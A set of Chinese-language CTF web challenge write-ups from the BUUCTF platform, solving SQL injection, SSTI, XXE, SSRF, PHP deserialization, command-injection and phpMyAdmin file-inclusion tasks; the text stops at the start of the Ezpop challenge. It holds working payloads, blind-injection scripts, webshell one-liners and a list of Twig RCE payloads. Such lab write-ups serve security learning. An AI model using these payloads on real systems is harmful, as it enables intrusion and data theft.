## [GXYCTF2019]BabySQli

**知识点**

> 在mysql中，进行联合查询时，如果数据不存在，联合查询就会构造一个虚拟的数据

现在有一个表，表里有以下数据

![image-20240202180037559](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202180037559.png)

我们执行sql语句

```sql
select * from test where username = '1' union select 0,'admin',"12345";
```

数据就被篡改了

![image-20240202180300916](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202180300916.png)

在这里，表里的密码是进行MD5加密的，所以payload是

```
name='union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
pw=123456
```



```http
POST /search.php HTTP/1.1
Host: 241ef65a-73aa-49ca-afad-1b7400e11aef.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://241ef65a-73aa-49ca-afad-1b7400e11aef.node5.buuoj.cn:81/search.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://241ef65a-73aa-49ca-afad-1b7400e11aef.node5.buuoj.cn:81
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

name=' union select 1,"admin","e10adc3949ba59abbe56e057f20f883e"--+&pw=123456
```

## [GYCTF2020]Blacklist

根据回显，知道过滤了很多关键字

```php
return                     preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

这里show没有被过滤，可以进行堆叠注入

**payload**

```
1';show tables;
1';show columns from FlagHere;
1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;
```

使用handler .... open语句进行查询，有下面的用法

> 例如,现在已知一张表名为tablename：
>
> ```
> handler tablename open;
> handler tablename read frist;
> handler tablename close;
> 
> 或者：
> 
> handler  tablename open as test;
> handler test read frist;
> handler test close;
> ```
>
> ```
> handler tablename read first; 读取tablename表的第一行信息。
> handler tablename read next;   读取tablename表的下一行信息。
> handler tablename read first limit 0,2; 读取tablename表的前两行信息。
> ```

## [CISCN2019 华北赛区 Day2 Web1]Hack World

[链接](https://www.jianshu.com/p/a98b1b9d3265)

![image-20240202201345772](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202201345772.png)

返回的是id=2时的结果

判断为数字型注入，但是过滤了很多（union，and，or，空格等）

空格可以利用`/**/`或圆括号代替

这里没有过滤圆括号

> if语句里面有三个参数
>
> if(a,b,c)
>
> 如果a的结果是true，那么就返回b，另就返回c
>
> 类似三目运算符

```
id=if(1,2,1) 这里回显2时的结果
```

**那么这题可以利用布尔盲注**

接着构造

```
id=if(mid((select(flag)from(flag)),1,1)='f',2,1) 测试flag第一位是不是f字母，返回true

```

那么我们可以写python代码实现读取flag

```python
import requests


url = "http://8622ee8e-2bad-4861-8340-9681a37cc067.node5.buuoj.cn:81/index.php"
string = ""
for i in range(1,45):
    str1 = "qwertyuiopasdfghjklzxcvbnm0123456789{}"
    for j in str1:
        sql = f"if(mid((select(flag)from(flag)),{i},1)='{j}',2,1)"
        # print(sql)
        data = {
            "id": sql
        }
        response = requests.post(url,data=data)
        if "Do you" in response.text:
            print(j)
            string = string + j

print(string)
```

二分盲注法

```python
import requests


url = "http://8622ee8e-2bad-4861-8340-9681a37cc067.node5.buuoj.cn:81/index.php"
string = []
for i in range(50):
    l, r, mid = 32, 127, (32+127)//2
    while l < r:
        sql = f"if(ascii(mid((select(flag)from(flag)),{i},1))>{mid},2,1)"
        data = {
            "id": sql
        }
        response = requests.post(url, data)
        if "Do you" in response.text:
            print(chr(mid))
            l = mid + 1
        else:
            r = mid
        mid = (l + r) // 2
    string.append(chr(int(mid)))

print("".join(string))
```

## [RoarCTF 2019]Easy Java

这是一道java题目，利用了文件读取漏洞

> 点击help，发现有一个help.docx文件，尝试进行下载。
>
> 发现用户名和密码都是通过post传递的，尝试post读取文件

下载下来文件里没有flag

尝试读取web.xml文件

```
filename=/WEB-INF/web.xml
```

![image-20240202203633477](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202203633477.png)

发现和flag有关的类，进行读取

```
filename=/WEB-INF/classes/com/wm/ctf/FlagController.class
```

![image-20240202203842824](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202203842824.png)

文件里发现flag，进行base解码，得到flag

## [网鼎杯 2018]Fakebook

考点：sql数字型注入，php序列化，file协议,爬虫协议，源码备份，SSRF

> 在view.php中发现数字型注入
>
> ```
> no=1 or 1=1 回显成功
> no=1 or 1=2 报错
> ```

> 进行读取数据库数据

测试字段数

```
no=-1 order by 1,2,3,4# 一共四个字段
```

读取数据库名（这里`union select`整体被过滤了）

```
-1 union/**/select 1,2,3,4
```

观察页面，发现只有2位置有回显，接着写语句

爆当前数据库 

```
-1 union/**/select 1,database(),3,4
fakebook
```

爆表名

```
-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'
users
```

爆字段名

```
-1 union/**/select 1,group_concat(column_name) ,3,4 from information_schema.columns where table_name='users'
no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
```

查看字段的值

```
-1 union/**/select 1,group_concat(no,';',username,';',passwd,';',data)  ,3,4 from users
```

```
1;11;74a49c698dbd3c12e36b0b287447d833f74f3937ff132ebff7054baa18623c35a705bb18b82e2ac0384b5127db97016e63609f712bc90e3506cfbea97599f46f;O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:9:"baidu.com";}
```

这里data的值是序列化字符串

> 发现网站目录下还有robots.txt
>
> ```
> User-agent: *
> Disallow: /user.php.bak
> ```
>
> 访问/user.php.bak，下载源码

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

> 通过get获得指定的URL，设置curl 参数，并将指定URL的内容返回，只要返回内容不为404即可

最后的payload

```
no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

利用SSRF漏洞和file协议，返回flag.php的内容

![image-20240202220349663](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202220349663.png)

base64解码即可

## [BJDCTF2020]The mystery of ip

> SSTI（Server-Side Template Injection）服务端模板注入主要是 Python 的一些框架，如  jinja2、mako、tornado、django，PHP 框架 smarty、twig，Java 框架 jade、velocity  等等使用渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控

![2916285-20220817093258173-1632680559](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/2916285-20220817093258173-1632680559.png)

查看hint.php

![image-20240203203551765](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240203203551765.png)

猜测和XFF有关

构造语句

```
X-Forwarded-For: 127.0.0.1
```

发现页面也变了，猜测存在ssti注入

根据上面的图进行测试

```
首先测试
X-Forwarded-For: ${7*7} 回显了 $49
接着构造成 a{*comment*}b 回显了 ab 基本可以说明是Smarty模板
```

**Smarty的一些常规利用的方式**

> 1. `{$smarty.version}`
>
>   ```
>   {$smarty.version}  #获取smarty的版本号
>   ```
> 2. `{php}{/php}`
>
>   ```
>   {php}phpinfo();{/php}  #执行相应的php代码
>   ```
>
>   因为在Smarty3版本中已经废弃`{php}`标签，强烈建议不要使用。在Smarty 3.1，`{php}`仅在SmartyBC中可用
> 3. `{literal}`
>
> ```js
> <script language="php">phpinfo();</script>
> ```
>
> 这种写法只适用于`php5`环境
> 4. getstreamvariable
>
>   ```
>   {self::getStreamVariable("file:///etc/passwd")}
>   ```
>
>   在3.1.30的Smarty版本中官方已经把该静态方法删除
> 5. `{if}{/if}`
>
>   ```
>   {if phpinfo()}{/if}
>   ```
>
>   Smarty的` {if} `条件判断和PHP的if非常相似，只是增加了一些特性。`每个{if}必须有一个配对的{/if}`，也可以使用`{else} 和 {elseif}`，全部的PHP条件表达式和函数都可以在if内使用，如`||，or，&&，and，is_array()`等等，如：`{if is_array($array)}{/if}`

最后的payload

```http
X-Forwarded-For: {if system("cat /flag")}{/if}
```

## [网鼎杯 2020 朱雀组]phpweb

> 这个form表单每5秒提交一次
>
> func的值传的是要执行的函数，p的值要传参数

![image-20240203211841135](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240203211841135.png)

那么现在就是一道代码执行题目了

先读一下它的源代码

```
func=highlight_file&p=index.php
```

过滤了n个函数

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p); //调用函数
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func); //转小写
        if (!in_array($func,$disable_fun)) { //判断是否在黑名单
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

使用

```
func=\system&p=ls /  //system前的\是绕过过滤的
```

我们直接进行RCE了，但是flag没找到，构造

```
func=\system&p=find / -name flag*
```

寻找所有文件名带flag的文件

![image-20240203213605801](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240203213605801.png)

```
func=\system&p=cat /tmp/flagoefiu4r93
```

最终payload

```http
POST /index.php HTTP/1.1
Host: 9a058e9d-b9a1-49d5-878c-3b099db1d9cb.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://9a058e9d-b9a1-49d5-878c-3b099db1d9cb.node5.buuoj.cn:81
Connection: close
Referer: http://9a058e9d-b9a1-49d5-878c-3b099db1d9cb.node5.buuoj.cn:81/index.php
Upgrade-Insecure-Requests: 1

func=\system&p=cat /tmp/flagoefiu4r93
```

另一种方法（看别人的解法）

构造反序列化字符串进行执行（有test类）

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:7:"\system";}
```

## [BSidesCF 2020]Had a bad day

![image-20240216211203666](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240216211203666.png)

根据报错发现会自己在后面加上`.php`，利用伪协议读取index.php

```
php://filter/read=convert.base64-encode/resource=index
```

得到源码

```php
<?php
	$file = $_GET['category'];

if(isset($file))
{
	if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
		include ($file . '.php');
	}
	else{
		echo "Sorry, we currently only support woofers and meowers.";
	}
}
?>
```

**strpos — 查找字符串首次出现的位置**

payload

尝试读取flag.php

```
php://filter/read=convert.base64-encode/index/resource=flag
```

得到flag

## [BJDCTF2020]ZJCTF，不过如此

知识点

> `preg_replace`函数的/e模式可以执行代码

> `${}`是变量处于""双引号字符串中的转义符，手册叫复杂(花括号)语法
> 在字符串中
> `" $type {$type} ${type}"`
> 这三个作用相同，后2种结合使用，用于引用复杂变量和避免歧义
> 比如`{${$type_name}}`变量的变量
> `$type_name='apple';
> $apple=5;
> echo "{${$type_name}}";` 显示5
>
> [可变变量](https://www.php.net/manual/zh/language.variables.variable.php)的一些知识点

> **反向引用**
>
> 对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

data协议写内容，读取next.php的内容

payload

```
text=data://text/plain,I have a dream
&file=php://filter/convert.base64-encode/resource=next.php
```

得到next.php的内容

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

payload

```
\S*=${phpinfo()} 可以执行phpinfo
这里我们执行getFlag这个函数
\S*=${getFlag()}或\S*={${getFlag()}}
```

最后的payload

```
\S*={${getFlag()}}&cmd=system('cat /flag');
```

## [BUUCTF 2018]Online Tool

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

X_FORWARDED_FOR和REMOTE_ADDR是服务器获取ip的

这里和这个没关系，主要是host参数

> escapeshellarg()函数
>
> 把字符串转码成可以在shell命令里使用的参数，将单引号进行转义，转义之后，再在左右加单引号；

> escapeshellcmd()函数
>
> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义,将
>
> ```
> & # ; ` | * ? ~ < > ^ ( ) [ ]{ } $ \ 、 \x0A和\xFF
> ```
>
> 以及不配对`的单/双引号转义；
>
> ```
> 反斜线（\）会在以下字符之前插入：`&#;`|*?~<>^()[]{}$\`、\x0A 和 \xFF。 ' 和 "仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符前面都有一个插入符号（^）。 
> ```

```php
<?php
    highlight_file(__FILE__);
	$host = $_GET['host'];
    echo $host."<br>";
    $host = escapeshellarg($host);
    echo $host."<br>";
    $host = escapeshellcmd($host);
    echo $host."<br>";
?>
```

```
传入
' <?php @eval($_POST["cmd"]);?> -oG test.php '
利用nmap的命令来做一些事
有一个参数-oG可以将命令和结果写到同一个文件上
```

结果

```
' <?php @eval($_POST["cmd"]);?> -oG test.php '
''\'' <?php @eval($_POST["cmd"]);?> -oG test.php '\'''
''\\'' \<\?php @eval\(\$_POST\["cmd"\]\)\;\?\> -oG test.php '\\'''
```

单引号全部闭合，上面的语句就是

```
\ <?php @eval($_POST["cmd"]);?> -oG test.php \\
```

写进去的test.php内容就是

```
nmap -T5 -sT -Pn --host-timeout 2 -F -oG test.php \ <?php @eval($_POST[cmd]);?> \\
```

## [GXYCTF2019]禁止套娃

利用githack获取源码

![image-20240217162123197](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240217162123197.png)

```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

首先过滤了一些伪协议，然后有一个正则表达式，最后过滤了一些关键字

```
/[a-z,_]+\((?R)?\)/
(?R)?表示递归整个匹配模式
这里只能传入如，a(b(c()));这样的值，所以这是一道无参数RCE
```

```
exp=print_r(scandir(current(localeconv()))); 查看当前目录文件，有flag.php
exp=show_source(next(array_reverse(scandir(current(localeconv())))));
翻转数组，利用next取小标为1的元素，查看源码，得到flag
```

利用session

```
?exp=print_r(session_id(session_start()));//session_start表示初始化session，如果header里面没有设置的话则自己创建;session_id获取session，
```

payload

```http
GET /?exp=show_source(session_id(session_start())); HTTP/1.1
Host: c3963d62-08d4-4ff4-823b-f03368a8fa37.node5.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://c3963d62-08d4-4ff4-823b-f03368a8fa37.node5.buuoj.cn/?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));
Connection: close
Cookie: PHPSESSID=flag.php
Upgrade-Insecure-Requests: 1
```

## [NCTF2019]Fake XML cookbook

抓包发现是xxe漏洞

直接引入外部实体读取flag

```http
POST /doLogin.php HTTP/1.1
Host: e304fe32-9df6-4e0c-aecd-2ac085749353.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/xml;charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 120
Origin: http://e304fe32-9df6-4e0c-aecd-2ac085749353.node5.buuoj.cn:81
Connection: close
Referer: http://e304fe32-9df6-4e0c-aecd-2ac085749353.node5.buuoj.cn:81/

<!DOCTYPE test [
<!ENTITY test SYSTEM 'file:///flag'>]>
<user><username>&test;</username><password>1</password></user>
```

## [GWCTF 2019]我有一个数据库

爆破出有phpmyadmin目录

![image-20240217215624266](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240217215624266.png)

当前版本是4.8.1的 CVE-2018-12613这个漏洞可以利用

index.php中的代码

```php
// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}

```

```php
$target_blacklist = array (
    'import.php', 'export.php'
);
```

```php
    public static function checkPageValidity(&$page, array $whitelist = [])
    {
        if (empty($whitelist)) { //判断是否空，是将$goto_whitelist赋值给他
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) { //判断是否在白名单中，是则返回true
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?') //截取，从开始到?的字符
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }
```

我们绕过过滤进行文件包含就可以

主要看checkPageValidity函数

我们满足三个true中的一个就行(第一个true没有用)

payload

```
phpmyadmin/index.php?target=db_datadict.php?/../../../../../flag
phpmyadmin/index.php?target=db_datadict.php%3f/../../../../../flag
phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../etc/passwd
```

我们还可进行session包含

> 在phpMyAdmin中执行`select "<?php phpinfo();?>"`语句
>  由于php的**session机制**，这条语句会写入服务器对应的session文件中
>  在浏览器中查找phpMyAdmin的**cookie值**
>  利用文件包含漏洞执行这个session文件，从而执行phpinfo()

payload

session保存的路径一般是`/tmp/sess_xxx`，需要看phpinfo中的session.save_path配置项

```
target=sql.php?/../../../../../../var/lib/php/sessions/sess_779hnmnumfm8vtjll0nc0ui8lj
```

当然 我们也可以写进一句话木马

尝试

```
select "<?php eval($_POST['hacker']);?>" into OUTFILE "/var/www/html/hacker.php"
```

这里想利用sql写入文件的漏洞，发现利用不成功

```
错误
SQL 查询： 文档
select "<?php eval($_POST['hacker']);?>" into OUTFILE "/var/www/html/hacker.php"
MySQL 返回： 文档
#1045 - Access denied for user 'test'@'%' (using password: YES)
```





利用dirseaerch

![image-20240217225409804](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240217225409804.png)

利用githack获取源码

![image-20240217225501319](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240217225501319.png)

```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
echo "the flag is: ".$flag;
```

foreach函数，循环遍历数组的键和值

exit函数，输出一则消息并且终止当前脚本

解法一

```
foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}
?handsome=flag&flag=handsome
```

解法二

```
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
?yds=flag
```

解法三

```
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
?flag=flag&is=flag
```

## [WUSTCTF2020]朴实无华

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?> 
```

第一关

```
num=2e4
intval会解析科学计数法，且当解析字符串时会保留第一个字符前的数字
```

第二关

```
$md5==md5($md5)
这里是==弱比较，
md5=0e215962017
这样0==0(true)
```

第三关

```
过滤了空格，cat
get_flag=tac${IFS}flllll*
```

## [BJDCTF2020]Cookie is so stable

发现输入什么都会回显输入的数据,这时候考虑是不是模板注入了。根据hint，注入点存在于cookie中

```
{{7*'7'}} 回显7777777 ==> Jinja2
{{7*'7'}} 回显49 ==> Twig 
```

```php
include 'vendor/twig/twig/lib/Twig/Autoloader.php';
Twig_Autoloader::register();
$loader = new Twig_Loader_String();
$twig = new Twig_Environment($loader);
try{
	$result = @$twig->render($_COOKIE['user']);
	echo "  Hello $result";
	} catch (Exception $e){
		echo "  What do you want to do?";
}
```

代码直接渲染了user的值，我们可以直接利用

payload

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

其他payload

```
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
```

## [安洵杯 2019]easy_web

打开网站发现有两个参数

img和cmd

对TXpVek5UTTFNbVUzTURabE5qYz0进行解码

![image-20240218160048220](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240218160048220.png)

应该存在文件包含，尝试读取index.php

![image-20240218160329735](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240218160329735.png)

payload

```
index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd=11
```

得到源码

```php+HTML
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

img这条路被堵死了，开头有`/[^a-zA-Z0-9.]+/`，就会被替换为空

接着看cmd参数

```
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
```

这里是MD5的强类型，需要进行碰撞。找了一对值

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

最后就是执行命令，绕过过滤了

```
这里过滤了许多，重点在这"|\\|\\\\|"，php中会经历两次解析，php解析与正则解析。第一次php转义为"|\|\\|",第二次正则转义，将中间的**|**转义为普通字符，结果为"||\|"。所以实际上匹配的是"|\"。它没有过滤"\"符号。
```

在linux系统里，在命令里可以加入`\`

```
cmd=c\at%20f\lag
```

最终的payload

```
cmd=dir%20/  查看根目录
cmd=c\at%20f\lag
```

## [MRCTF2020]Ezpop

```php
 <?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
